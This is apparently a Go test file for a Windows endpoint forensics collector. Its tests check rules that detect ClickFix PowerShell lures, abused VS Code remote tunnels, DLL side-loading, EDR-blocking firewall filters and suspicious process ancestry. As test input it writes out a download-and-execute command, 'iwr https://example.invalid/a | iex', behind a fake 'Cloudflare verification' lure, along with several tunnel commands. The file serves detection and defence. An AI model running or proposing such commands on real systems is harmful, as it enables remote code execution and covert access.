package collector

import (
	"testing"
	"time"
)

func TestModernCommandsRequireSpecificBehavior(t *testing.T) {
	for _, tc := range []struct {
		image, cmd, rule string
		want             bool
	}{
		{"powershell.exe", `powershell -c "Write-Host 'Cloudflare verification'; iwr https://example.invalid/a | iex"`, "exec.clickfix_lure", true},
		{"powershell.exe", `powershell -c "Write-Host 'Cloudflare verification'"`, "exec.clickfix_lure", false},
		{"powershell.exe", `powershell -c "iwr https://example.invalid/manual.pdf -OutFile manual.pdf"`, "exec.clickfix_lure", false},
		{"code.exe", `code.exe tunnel --name workstation`, "remote.ide_tunnel", true},
		{"update.exe", `update.exe tunnel --accept-server-license-terms`, "remote.ide_tunnel", true},
		{"cloudflared.exe", `cloudflared.exe tunnel run`, "remote.ide_tunnel", false},
		{"code.exe", `code.exe tunnel-guide.txt`, "remote.ide_tunnel", false},
		{"powershell.exe", `powershell.exe -c "echo 'tool tunnel --accept-server-license-terms'"`, "remote.ide_tunnel", false},
		{"code.exe", `code.exe --cli-data-dir "C:\cache dir" tunnel`, "remote.ide_tunnel", true},
		{"code.exe", `code.exe readme.txt tunnel`, "remote.ide_tunnel", false},
	} {
		fs := analyzeCommandLine("test", tc.image, tc.cmd)
		if hasRule(fs, tc.rule) != tc.want {
			t.Errorf("%q: %+v", tc.cmd, fs)
		}
	}
}

func TestSideLoadCandidateNeedsSignatureEvidence(t *testing.T) {
	image, dll := `C:\ProgramData\cache\host.exe`, `C:\ProgramData\cache\dui70.dll`
	trusted := SignatureResult{State: SigTrusted}
	unsigned := SignatureResult{State: SigUnsigned}
	if len(sideLoadFinding(image, dll, trusted, unsigned)) != 1 {
		t.Fatal("signed host/unsigned adjacent DLL missed")
	}
	for _, tc := range []struct {
		image, dll   string
		host, module SignatureResult
	}{
		{image, dll, SignatureResult{}, unsigned}, {image, dll, trusted, trusted},
		{`C:\Windows\System32\host.exe`, `C:\Windows\System32\dui70.dll`, trusted, unsigned},
		{image, `C:\ProgramData\elsewhere\dui70.dll`, trusted, unsigned},
	} {
		if len(sideLoadFinding(tc.image, tc.dll, tc.host, tc.module)) != 0 {
			t.Fatalf("false sideload claim: %+v", tc)
		}
	}
}

func TestWFPClassificationRequiresOutboundExactAgentMatch(t *testing.T) {
	if len(wfpFilterFindings(`\device\harddiskvolume3\agent\MsSense.exe`, "ale_auth_connect_v4", "equal")) != 1 {
		t.Fatal("agent block missed")
	}
	for _, v := range []struct{ app, layer, match string }{
		{`C:\agent\MsSense.exe`, "inbound", "equal"}, {`C:\agent\MsSense.exe`, "ale_auth_connect_v4", "other"},
		{`C:\agent\not-msSense.exe`, "ale_auth_connect_v4", "equal"},
	} {
		if len(wfpFilterFindings(v.app, v.layer, v.match)) != 0 {
			t.Fatalf("false agent block: %+v", v)
		}
	}
}

func TestModernAncestryRejectsPIDReuseAndUnknownTimes(t *testing.T) {
	start := time.Date(2026, 11, 1, 12, 0, 0, 0, time.UTC)
	for _, mode := range []string{"valid", "reused", "unknown", "later", "ordinary"} {
		parent := Record{Fields: map[string]any{"pid": uint32(10), "name": "wscript.exe", "created_at": start}}
		child := Record{Fields: map[string]any{"pid": uint32(20), "ppid": uint32(10), "image_path": `C:\ProgramData\update.exe`, "original_file_name": "code.exe", "command_line": "update.exe tunnel", "created_at": start.Add(time.Second)}}
		switch mode {
		case "reused":
			child.Fields["parent_pid_reused"] = true
		case "unknown":
			delete(parent.Fields, "created_at")
		case "later":
			parent.Fields["created_at"] = start.Add(time.Hour)
		case "ordinary":
			parent.Fields["name"] = "cmd.exe"
		}
		r := []Result{{Collector: "processes", Records: []Record{parent, child}}}
		Correlate(r)
		if got := hasRule(r[0].Records[1].Findings, "remote.ide_tunnel_suspicious_context"); got != (mode == "valid") {
			t.Errorf("%s: %+v", mode, r[0].Records[1])
		}
		if !hasRule(r[0].Records[1].Findings, "remote.ide_tunnel") {
			t.Fatal("tunnel inventory evidence lost")
		}
	}
}

func TestRunMRUJoinIsExactAndAccountScoped(t *testing.T) {
	cmd := `powershell -c "iwr https://example.invalid/a | iex"`
	for _, mode := range []string{"exact", "other_account", "different_case", "different_quoted_spaces"} {
		sid, history := "S-1-5-21-1", cmd
		switch mode {
		case "other_account":
			sid = "S-1-5-21-2"
		case "different_case":
			history = `PowerShell -c "iwr https://example.invalid/a | iex"`
		case "different_quoted_spaces":
			history = `powershell -c "iwr  https://example.invalid/a | iex"`
		}
		r := []Result{{Collector: "processes", Records: []Record{{Fields: map[string]any{"pid": 10, "command_line": cmd, "user_sid": "S-1-5-21-1"}, Findings: []Finding{{Rule: "exec.download_execute", Severity: SevSuspect}}}}},
			{Collector: "runhistory", Records: []Record{{Fields: map[string]any{"user_sid": sid, "command_sha256": commandDigest(history)}}}}}
		Correlate(r)
		if hasRule(r[0].Records[0].Findings, "correlate.run_dialog_command") != (mode == "exact") {
			t.Fatalf("%s: unsafe command match", mode)
		}
	}
}

func TestSideLoadCorrelationRequiresExactCreationTime(t *testing.T) {
	start := time.Date(2026, 11, 1, 12, 0, 0, 0, time.UTC)
	for _, valid := range []bool{true, false} {
		stamp := start
		if !valid {
			stamp = start.Add(time.Second)
		}
		r := []Result{{Collector: "processes", Records: []Record{
			{Fields: map[string]any{"pid": 10, "image_path": `C:\ProgramData\host.exe`, "created_at": start}},
			{Fields: map[string]any{"pid": 20, "ppid": 10, "created_at": start.Add(time.Minute)}, Findings: []Finding{{Rule: "exec.download_execute", Severity: SevSuspect}}}}},
			{Collector: "modules", Records: []Record{{Fields: map[string]any{"pid": 10, "image_path": `C:\ProgramData\host.exe`, "process_created_at": stamp}, Findings: []Finding{{Rule: "modules.side_load_candidate", Severity: SevNotable}}}}}}
		Correlate(r)
		if hasRule(r[1].Records[0].Findings, "correlate.dll_sideload_context") != valid {
			t.Fatalf("valid=%v: %+v", valid, r)
		}
		if valid && len(graphEdges(BuildEvidenceGraph(r, ""), "corroborates_detection")) != 2 {
			t.Fatal("missing evidence graph references")
		}
	}
}
